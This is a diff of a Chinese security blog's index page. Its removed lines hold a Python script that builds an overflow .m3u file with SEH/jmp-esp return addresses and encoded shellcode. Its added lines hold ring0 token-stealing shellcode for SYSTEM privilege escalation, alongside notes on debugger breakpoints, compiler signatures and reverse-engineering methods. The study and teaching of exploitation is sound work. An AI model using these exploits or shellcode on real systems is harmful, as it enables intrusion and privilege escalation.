#eip pop pop retn</span><br><span class="line">    f.write(&quot;\x90&quot; *4 ) #retn4</span><br><span class="line">    f.write(&quot;\xCC&quot;)</span><br><span class="line">    f.write(&quot;\x90&quot; * 6)</span><br><span class="line">    f.write(&quot;\xCC&quot;)</span><br><span class="line">    f.write(&quot;\x31\xae\x80\x7c&quot; ) #eip jmp esp</span><br><span class="line">    f.write(&quot;\x90&quot; * 25) #必须 如果确实这些会shellcode会执行错误</span><br><span class="line">    buf = &quot;&quot;</span><br><span class="line">    buf += &quot;\x89\xe7\xdd\xc1\xd9\x77\xf4\x5e\x56\x59\x49\x49\x49&quot;</span><br><span class="line">    buf += &quot;\x49\x43\x43\x43\x43\x43\x43\x51\x5a\x56\x54\x58\x33&quot;</span><br><span class="line">    buf += &quot;\x30\x56\x58\x34\x41\x50\x30\x41\x33\x48\x48\x30\x41&quot;</span><br><span class="line">    buf += &quot;\x30\x30\x41\x42\x41\x41\x42\x54\x41\x41\x51\x32\x41&quot;</span><br><span class="line">    buf += &quot;\x42\x32\x42\x42\x30\x42\x42\x58\x50\x38\x41\x43\x4a&quot;</span><br><span class="line">    buf += &quot;\x4a\x49\x58\x59\x4a\x4b\x4d\x4b\x38\x59\x34\x34\x36&quot;</span><br><span class="line">    buf += &quot;\x44\x4b\x44\x30\x31\x39\x42\x4f\x42\x33\x47\x46\x51&quot;</span><br><span class="line">    buf += &quot;\x48\x49\x33\x54\x4c\x4b\x32\x51\x56\x50\x4c\x4b\x52&quot;</span><br><span class="line">    buf += &quot;\x56\x34\x4c\x4c\x4b\x33\x46\x55\x4c\x4c\x4b\x37\x36&quot;</span><br><span class="line">    buf += &quot;\x53\x38\x4c\x4b\x53\x4e\x47\x50\x4c\x4b\x46\x56\x46&quot;</span><br><span class="line">    buf += &quot;\x58\x50\x4f\x45\x48\x44\x35\x4c\x33\x46\x39\x45\x51&quot;</span><br><span class="line">    buf += &quot;\x48\x51\x4b\x4f\x4b\x51\x55\x30\x4c\x4b\x42\x4c\x57&quot;</span><br><span class="line">    buf += &quot;\x54\x31\x34\x4c\x4b\x37\x35\x47\x4c\x4c\x4b\x56\x34&quot;</span><br><span class="line">    buf += &quot;\x36\x48\x32\x58\x35\x51\x4b\x5a\x4c\x4b\x30\x4a\x45&quot;</span><br><span class="line">    buf += &quot;\x48\x4c\x4b\x51\x4a\x51\x30\x55\x51\x4a\x4b\x5a\x43&quot;</span><br><span class="line">    buf += &quot;\x30\x34\x30\x49\x4c\x4b\x46\x54\x4c\x4b\x35\x51\x4a&quot;</span><br><span class="line">    buf += &quot;\x4e\x46\x51\x4b\x4f\x50\x31\x4f\x30\x4b\x4c\x4e\x4c&quot;</span><br><span class="line">    buf += &quot;\x4d\x54\x39\x50\x52\x54\x33\x37\x49\x51\x38\x4f\x44&quot;</span><br><span class="line">    buf += &quot;\x4d\x35\x51\x49\x57\x5a\x4b\x4c\x34\x57\x4b\x43\x4c&quot;</span><br><span class="line">    buf += &quot;\x31\x34\x47\x58\x32\x55\x4d\x31\x4c\x4b\x30\x5a\x57&quot;</span><br><span class="line">    buf += &quot;\x54\x53\x31\x4a\x4b\x42\x46\x4c\x4b\x54\x4c\x30\x4b&quot;</span><br><span class="line">    buf += &quot;\x4c\x4b\x50\x5a\x35\x4c\x53\x31\x5a\x4b\x4c\x4b\x35&quot;</span><br><span class="line">    buf += &quot;\x54\x4c\x4b\x35\x51\x4b\x58\x4d\x59\x30\x44\x51\x34&quot;</span><br><span class="line">    buf += &quot;\x45\x4c\x45\x31\x49\x53\x48\x32\x43\x38\x47\x59\x49&quot;</span><br><span class="line">    buf += &quot;\x44\x4d\x59\x4d\x35\x4c\x49\x59\x52\x33\x58\x4c\x4e&quot;</span><br><span class="line">    buf += &quot;\x30\x4e\x54\x4e\x4a\x4c\x51\x42\x4d\x38\x4d\x4f\x4b&quot;</span><br><span class="line">    buf += &quot;\x4f\x4b\x4f\x4b\x4f\x4c\x49\x50\x45\x34\x44\x4f\x4b&quot;</span><br><span class="line">    buf += &quot;\x43\x4e\x49\x48\x4d\x32\x52\x53\x4c\x47\x45\x4c\x57&quot;</span><br><span class="line">    buf += &quot;\x54\x31\x42\x4b\x58\x4c\x4e\x4b\x4f\x4b\x4f\x4b\x4f&quot;</span><br><span class="line">    buf += &quot;\x4b\x39\x30\x45\x34\x48\x32\x48\x52\x4c\x32\x4c\x51&quot;</span><br><span class="line">    buf += &quot;\x30\x51\x51\x45\x38\x57\x43\x36\x52\x46\x4e\x33\x54&quot;</span><br><span class="line">    buf += &quot;\x35\x38\x32\x55\x34\x33\x43\x55\x34\x32\x46\x50\x49&quot;</span><br><span class="line">    buf += &quot;\x4b\x4c\x48\x31\x4c\x46\x44\x55\x5a\x4b\x39\x4d\x36&quot;</span><br><span class="line">    buf += &quot;\x50\x56\x4b\x4f\x46\x35\x54\x44\x4c\x49\x58\x42\x50&quot;</span><br><span class="line">    buf += &quot;\x50\x4f\x4b\x49\x38\x39\x32\x50\x4d\x4f\x4c\x4c\x47&quot;</span><br><span class="line">    buf += &quot;\x45\x4c\x57\x54\x46\x32\x4a\x48\x51\x4f\x4b\x4f\x4b&quot;</span><br><span class="line">    buf += &quot;\x4f\x4b\x4f\x35\x38\x42\x4f\x43\x48\x56\x38\x57\x50&quot;</span><br><span class="line">    buf += &quot;\x45\x38\x43\x51\x42\x47\x45\x35\x31\x52\x35\x38\x30&quot;</span><br><span class="line">    buf += &quot;\x4d\x43\x55\x54\x33\x43\x43\x50\x31\x59\x4b\x4b\x38&quot;</span><br><span class="line">    buf += &quot;\x51\x4c\x36\x44\x35\x5a\x4c\x49\x5a\x43\x53\x58\x30&quot;</span><br><span class="line">    buf += &quot;\x58\x37\x50\x51\x30\x51\x30\x52\x48\x50\x4d\x36\x33&quot;</span><br><span class="line">    buf += &quot;\x51\x56\x31\x31\x35\x38\x53\x42\x42\x4f\x52\x4d\x47&quot;</span><br><span class="line">    buf += &quot;\x50\x35\x38\x42\x4f\x46\x4c\x47\x50\x45\x36\x45\x38&quot;</span><br><span class="line">    buf += &quot;\x57\x38\x42\x45\x32\x4c\x42\x4c\x50\x31\x58\x49\x4c&quot;</span><br><span class="line">    buf += &quot;\x48\x50\x4c\x57\x54\x34\x50\x4c\x49\x4d\x31\x50\x31&quot;</span><br><span class="line">    buf += &quot;\x38\x52\x36\x32\x56\x33\x56\x31\x46\x32\x4b\x4f\x4e&quot;</span><br><span class="line">    buf += &quot;\x30\x36\x51\x49\x50\x36\x30\x4b\x4f\x50\x55\x53\x38&quot;</span><br><span class="line">    buf += &quot;\x41\x41&quot;</span><br><span class="line">    f.write(buf)</span><br></pre></td></tr></table></figure>
-</li>
-</ul>
-<p>当缓冲区起始于栈顶下方时,可以使用一系列的POP指令和RET指令,来使字节弹出zhan,ESP指针越来越接近shellcode,当最后执行RET会将shellcode地址压入EIP</p>
-<ul>
-<li><p>push return</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">push esp 54</span><br><span class="line">retn     C3</span><br><span class="line"></span><br><span class="line">当寄存器指向shellcode,但是没有jump Reg/call Reg,则可以通过push Reg</span><br><span class="line">retn</span><br><span class="line">由于retn会将Reg的内容压入Eip</span><br><span class="line"></span><br><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"></span><br><span class="line">with open(&quot;crash.m3u&quot;,&quot;w+&quot;) as f:</span><br><span class="line">    f.write(&quot;\x41&quot; * (25000+1067))</span><br><span class="line">    f.write(&quot;\x5C\xDF\x80\x7C&quot; ) #pop pop retn</span><br><span class="line">    f.write(&quot;\x90&quot; *4 ) #retn4</span><br><span class="line">    f.write(&quot;\xCC&quot;)</span><br><span class="line">    f.write(&quot;\x90&quot; * 6)</span><br><span class="line">    f.write(&quot;\xCC&quot;)</span><br><span class="line">    f.write(&quot;\x72\x1E\x81\x7c&quot; ) #eip push esp retn</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>jmp [reg + offset]</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">寄存器指向包含shellcode地址的缓冲区,但是没有指向入口,通过指向</span><br><span class="line">jmp [Reg+offset]跳转到入口</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>SHE<br>通过自己的地址去覆盖SHE,迫使跳转至shellcode,但是需要处理safeShe以及SHEOP</p>
-</li>
-<li><p>应对狭窄型缓冲区<br>利用跳转指令跳至任意地址</p>
-</li>
-<li><p>short jumps/conditional jumps</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">jmp short 0xeb</span><br><span class="line"></span><br><span class="line">条件跳转:</span><br><span class="line">根据EFLAGS寄存器的状态来实现跳转</span><br></pre></td></tr></table></figure></li>
-</ul>
+        <ol>
+<li>畸形RetAddr断点<br>将返回函数地址修改为一个非法地址(0xFFFFFFFF),调试时会触发非法内存访问错误,使调试器中断,从而能通过栈回溯找到上一次函数调用</li>
+<li>设置条件断点或者记录断点<br>ollydbg 条件断点(shift+F2) 条件记录断点(shift+F4)<br>条件表达式格式:<br><img src="http://picture.jbyusk.com:8080/ollydbg/ollydbg01.png" alt="摘自0day书"><br><img src="http://picture.jbyusk.com:8080/ollydbg/ollydbg02.png" alt="摘自0day书"><br>实例:<br><img src="http://picture.jbyusk.com:8080/ollydbg/ollydbg03.png" alt="摘自0day书"><br>3.消息断点<br>调试UI程序时常用技巧<br>下断在TranslateMessage:bp TranslateMessage MSG==WM_LBUTTONUP<br>alt+F9返回到主程序领空<br>然后进入DispatchMessage函数,在代码段下内存访问断点,第一次断点即为按钮所执行代码<br>4.内存断点和硬件断点<br>5.常见断点<br><img src="http://picture.jbyusk.com:8080/ollydbg/ollydbg_nor_bk01.png" alt="摘自0day书"><br><img src="http://picture.jbyusk.com:8080/ollydbg/ollydbg_nor_bk02.png" alt="摘自0day书"></li>
+</ol>
 
       
 
@@ -400,7 +391,7 @@
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">shellcode</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">漏洞分析</a>
         		</li>
       		
 		</ul>
@@ -410,7 +401,7 @@
 
       
         <p class="article-more-link">
-          <a class="article-more-a" href="/2018/08/20/迫使shellcode执行方法/">展开全文 >></a>
+          <a class="article-more-a" href="/2018/08/20/下断技巧/">展开全文 >></a>
         </p>
       
 
@@ -524,20 +515,20 @@
         <!-- 目录内容结束 -->
 
   
-    <article id="post-smali" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+    <article id="post-逆向基础02" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2018/08/20/smali/">smali</a>
+      <a class="article-title" href="/2018/08/20/逆向基础02/">逆向基础02-编译器特征</a>
     </h1>
   
 
 		
         
-        <a href="/2018/08/20/smali/" class="archive-article-date">
+        <a href="/2018/08/20/逆向基础02/" class="archive-article-date">
   	<time datetime="2018-08-20T08:46:07.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-08-20</time>
 </a>
         
@@ -547,178 +538,27 @@
     <div class="article-entry" itemprop="articleBody">
       
         <blockquote>
-<p>数据类型和描述符</p>
+<p>EXEINFO与PEID的原理<br>查壳或者查询编译语言使用特征<br>1.OEP特征<br>2.链接器特征<br>3.人肉查找的时候,查看区段名称</p>
 </blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">基本类型:</span><br><span class="line">boolean Z</span><br><span class="line">byte 	B</span><br><span class="line">short 	S</span><br><span class="line">char 	C</span><br><span class="line">int 	I</span><br><span class="line">long	J</span><br><span class="line">float	F</span><br><span class="line">void 	V</span><br><span class="line">double  D</span><br><span class="line"></span><br><span class="line">引用类型:</span><br><span class="line">数组和对象</span><br><span class="line">数组:</span><br><span class="line">[I   一维数组</span><br><span class="line">[[I  二维数组</span><br><span class="line">[Ljava/lang/String; 一维String数组</span><br></pre></td></tr></table></figure>
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">android</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2018/08/20/smali/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
- <!-- 目录内容 -->
-             
-        <!-- 目录内容结束 -->
-
-  
-    <article id="post-PE文件数据结构" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/08/20/PE文件数据结构/">PE文件数据结构</a>
-    </h1>
-  
-
-		
-        
-        <a href="/2018/08/20/PE文件数据结构/" class="archive-article-date">
-  	<time datetime="2018-08-20T08:46:07.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-08-20</time>
-</a>
-        
-      </header>
-
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <blockquote>
-<p>IMAGE_DOS_HEADER dos头部</p>
-</blockquote>
-        
-          <a class="article-more-a" href="/2018/08/20/PE文件数据结构/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">Window编程原理</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2018/08/20/PE文件数据结构/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
- <!-- 目录内容 -->
-             
-        <!-- 目录内容结束 -->
-
-  
-    <article id="post-ollydbg软件" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/08/20/ollydbg软件/">ollydbg软件</a>
-    </h1>
-  
-
-		
-        
-        <a href="/2018/08/20/ollydbg软件/" class="archive-article-date">
-  	<time datetime="2018-08-20T08:46:07.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-08-20</time>
-</a>
-        
-      </header>
-
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <blockquote>
-<p>od支持的调试方式<br>① 支持拖拽<br>② 支持菜单 -文件 -打开,打开的时候可以添加命令行参数<br>③ 支持右键菜单打开<br>④ 支持附加调试<br>⑤ 支持DLL调试<br>⑥ 支持多线程调试</p>
-</blockquote>
-<blockquote>
-<p>od中的断点有哪些,原理分别是什么?<br>① 软件断点,F2,修改代码处为int3,异常触发再还原<br>② 硬件断点,寄存器设置地址到dr0~dr3,dr6,触发单步异常<br>③ 内存断点,修改属性(VirtualProtectEx)<br>④ 条件断点,Shift+F2,与软件断点一样<br>⑤ 消息断点，在条件基础上增加了宏定义<br>⑥ 记录断点，利用跟踪记录,然后设置条件,可以断下 </p>
-</blockquote>
-<p>快捷方式</p>
+<h3 id="BC"><a href="#BC" class="headerlink" title="BC++"></a>BC++</h3><ol>
+<li>OEP特征<br><img src="http://picture.jbyusk.com:8080/res/BC++.png" alt=""><br>二进制特征:EB 10 66 62 3A 43 2B 2B 48 4F 4B<br>第一个调用的API是GetModHandleA</li>
+<li>链接器版本<br>5.00</li>
+<li>区段名称<br><img src="http://picture.jbyusk.com:8080/res/BC++1.png" alt=""></li>
+</ol>
+<h3 id="delphi"><a href="#delphi" class="headerlink" title="delphi+"></a>delphi+</h3><ol>
+<li>OEP特征<br><img src="http://picture.jbyusk.com:8080/res/delphi1.png" alt=""><br>二进制特征:55 8B EC 83 C4 F0 B8 ?? ?? ?? ?? E8<br>OEP处有5个CALL调用,第一个API调用是GetModuleHandleA<br>第一个调用的API是GetModHandleA</li>
+<li>链接器版本<br>2.25</li>
+<li>区段名称<br><img src="http://picture.jbyusk.com:8080/res/delphi2.png" alt=""></li>
+</ol>
+<h3 id="VC6-0-amp-易语言"><a href="#VC6-0-amp-易语言" class="headerlink" title="VC6.0 &amp; 易语言"></a>VC6.0 &amp; 易语言</h3><ol>
+<li>OEP特征<br><img src="http://picture.jbyusk.com:8080/res/yilan1.png" alt=""><br>二进制特征:55 8B EC 6A FF 68 ?? ?? ?? ?? 68 ?? ?? ?? ?? 64 A1 00 00 00 00 50 64 89 25 00 00 00 00 83 EC 58<br>OEP处开辟堆栈空间是sub esp,0x58<br>OEP处API调用GetVersion<br>第一个调用的API是GetModHandleA</li>
+<li>链接器版本<br>6.0</li>
+<li>区段名称<br><img src="http://picture.jbyusk.com:8080/res/yilan2.png" alt=""></li>
+</ol>
+<h3 id="VS程序的链接器版本"><a href="#VS程序的链接器版本" class="headerlink" title="VS程序的链接器版本"></a>VS程序的链接器版本</h3><p>VC 6.0 6.0<br>VC2003 7.0，7.1<br>VS2005 8.0<br>VS2008 9.0<br>VS2010 10.0<br>VS2012 11.0<br>VS2013 12.0<br>VS2015 14.0<br>VS2017 14.1</p>
+<ul>
+<li>VS2013 main函数特征<br>1.二进制特征<br>50 E8 ???????? 8B 00 50 E8 ???????? 8B 08 51 E8</li>
+</ul>
 
       
 
@@ -742,7 +582,7 @@
 
       
         <p class="article-more-link">
-          <a class="article-more-a" href="/2018/08/20/ollydbg软件/">展开全文 >></a>
+          <a class="article-more-a" href="/2018/08/20/逆向基础02/">展开全文 >></a>
         </p>
       
 
@@ -776,20 +616,20 @@
         <!-- 目录内容结束 -->
 
   
-    <article id="post-基于SEH的exploit" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+    <article id="post-注入方式" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2018/08/20/基于SEH的exploit/">基于SEH的exploit</a>
+      <a class="article-title" href="/2018/08/20/注入方式/">dll注入方式</a>
     </h1>
   
 
 		
         
-        <a href="/2018/08/20/基于SEH的exploit/" class="archive-article-date">
+        <a href="/2018/08/20/注入方式/" class="archive-article-date">
   	<time datetime="2018-08-20T08:46:07.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-08-20</time>
 </a>
         
@@ -799,6 +639,88 @@
     <div class="article-entry" itemprop="articleBody">
       
         
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">dll注入</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2018/08/20/注入方式/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+ <!-- 目录内容 -->
+             
+        <!-- 目录内容结束 -->
+
+  
+    <article id="post-内核shellcode" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/08/20/内核shellcode/">ring0 shellcode</a>
+    </h1>
+  
+
+		
+        
+        <a href="/2018/08/20/内核shellcode/" class="archive-article-date">
+  	<time datetime="2018-08-20T08:46:07.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-08-20</time>
+</a>
+        
+      </header>
+
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <blockquote>
+<p>提权到SYSTEM 修改当前进程的token为SYSTEM进程的token</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">DWORD g_uCro;</span><br><span class="line">DWORD g_isRing0ShellCodeCalled = 0;</span><br><span class="line">NTSTATUS MyshellCode() &#123;</span><br><span class="line">	//关闭内核写保护</span><br><span class="line">	__asm</span><br><span class="line">	&#123;</span><br><span class="line">		cli</span><br><span class="line">		mov eax,cr0</span><br><span class="line">		mov g_uCro,eax</span><br><span class="line">		and eax,0xFFFEFFFF</span><br><span class="line">		mov cro,eax</span><br><span class="line">	&#125;</span><br><span class="line">	//提权到system</span><br><span class="line">	__asm</span><br><span class="line">	&#123;</span><br><span class="line">		mov eax,0xFFDFF124 //eax = KPCR(not 3G Mode)</span><br><span class="line">		mov eax,[eax]      //获取当前线程PETHREAD</span><br><span class="line">		mov esi,[eax+0x220] //获取当前进程所属进程的PEROCESS</span><br><span class="line">		mov eax,esi</span><br><span class="line">		searchXp:</span><br><span class="line">			mov eax,[eax+0x88]</span><br><span class="line">			sub eax,0x88 //获取进程链表下一个进程的PEPROCESS</span><br><span class="line">			mov edx,[eax+0x84] //获取进程的PID到edx</span><br><span class="line">			cmp edx,0x4 //通过PID查找SYSTEM进程</span><br><span class="line">			jne searchXp</span><br><span class="line">			mov eax,[eax+0xc8] //获取system进程的token</span><br><span class="line">			mov [esi+0xc8],eax //修改当前进程的token</span><br><span class="line">	&#125;</span><br><span class="line">	//恢复内核写保护</span><br><span class="line">	__asm</span><br><span class="line">	&#123;</span><br><span class="line">		sti</span><br><span class="line">		mov eax,g_uCro</span><br><span class="line">		mov cro,eax</span><br><span class="line">	&#125;</span><br><span class="line">	g_isRing0ShellCodeCalled = 1;</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
       
 
       
@@ -813,6 +735,10 @@
         		<li class="article-tag-list-item">
         			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">shellcode</a>
         		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">Window内核漏洞利用</a>
+        		</li>
       		
 		</ul>
 	</div>
@@ -821,7 +747,7 @@
 
       
         <p class="article-more-link">
-          <a class="article-more-a" href="/2018/08/20/基于SEH的exploit/">展开全文 >></a>
+          <a class="article-more-a" href="/2018/08/20/内核shellcode/">展开全文 >></a>
         </p>
       
 
@@ -855,20 +781,20 @@
         <!-- 目录内容结束 -->
 
   
-    <article id="post-下断技巧" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+    <article id="post-逆向分析方法" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2018/08/20/下断技巧/">下段技巧</a>
+      <a class="article-title" href="/2018/08/20/逆向分析方法/">逆向分析方法</a>
     </h1>
   
 
 		
         
-        <a href="/2018/08/20/下断技巧/" class="archive-article-date">
+        <a href="/2018/08/20/逆向分析方法/" class="archive-article-date">
   	<time datetime="2018-08-20T08:46:07.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-08-20</time>
 </a>
         
@@ -878,9 +804,12 @@
     <div class="article-entry" itemprop="articleBody">
       
         <ol>
-<li>畸形RetAddr断点<br>将返回函数地址修改为一个非法地址(0xFFFFFFFF),调试时会触发非法内存访问错误,使调试器中断,从而能通过栈回溯找到上一次函数调用</li>
-<li>设置条件断点或者记录断点<br>ollydbg 条件断点(shift+F2) 条件记录断点(shift+F4)<br>条件表达式格式:<br><img src="http://picture.jbyusk.com:8080/ollydbg/ollydbg01.png" alt="摘自0day书"><br><img src="http://picture.jbyusk.com:8080/ollydbg/ollydbg02.png" alt="摘自0day书"><br>实例:<br><img src="http://picture.jbyusk.com:8080/ollydbg/ollydbg03.png" alt="摘自0day书"><br>3.消息断点<br>调试UI程序时常用技巧<br>下断在TranslateMessage:bp TranslateMessage MSG==WM_LBUTTONUP<br>alt+F9返回到主程序领空<br>然后进入DispatchMessage函数,在代码段下内存访问断点,第一次断点即为按钮所执行代码<br>4.内存断点和硬件断点<br>5.常见断点<br><img src="http://picture.jbyusk.com:8080/ollydbg/ollydbg_nor_bk01.png" alt="摘自0day书"><br><img src="http://picture.jbyusk.com:8080/ollydbg/ollydbg_nor_bk02.png" alt="摘自0day书"></li>
+<li>自上而下的分析<br>从程序入口点开始分析,模拟程序运行的整个流程,对程序进行分析</li>
+<li>自下而上分析<br>找到关键API,栈回溯分析,比如程序弹出MessageBoxA/W，从弹框栈回溯分析找到窗口回调函数,从窗口回调函数开始分析</li>
+<li>字符串分析<br>根据弹窗提示的字符串,再调试器中查找,定位关键代码,再分析<br>根据调试时查看到的第三方库的版本号<br>比如:加密通讯库openssl  嵌入式脚本lua</li>
+<li>源码对比分析<br>分析源码特征,然后去调试分析<br>5.假设某一个函数的内部复杂,可以在成功调用函数的代码处,不停调用目标函数,构造类似参数,从返回值,传出参数来判断函数的功能。</li>
 </ol>
+<p>分析心态:分析过程中不停猜测程序的意图和流程</p>
 
       
 
@@ -894,7 +823,7 @@
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">漏洞分析</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">逆向</a>
         		</li>
       		
 		</ul>
@@ -904,7 +833,102 @@
 
       
         <p class="article-more-link">
-          <a class="article-more-a" href="/2018/08/20/下断技巧/">展开全文 >></a>
+          <a class="article-more-a" href="/2018/08/20/逆向分析方法/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+ <!-- 目录内容 -->
+             
+        <!-- 目录内容结束 -->
+
+  
+    <article id="post-Hook原理" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/08/20/Hook原理/">HooK原理</a>
+    </h1>
+  
+
+		
+        
+        <a href="/2018/08/20/Hook原理/" class="archive-article-date">
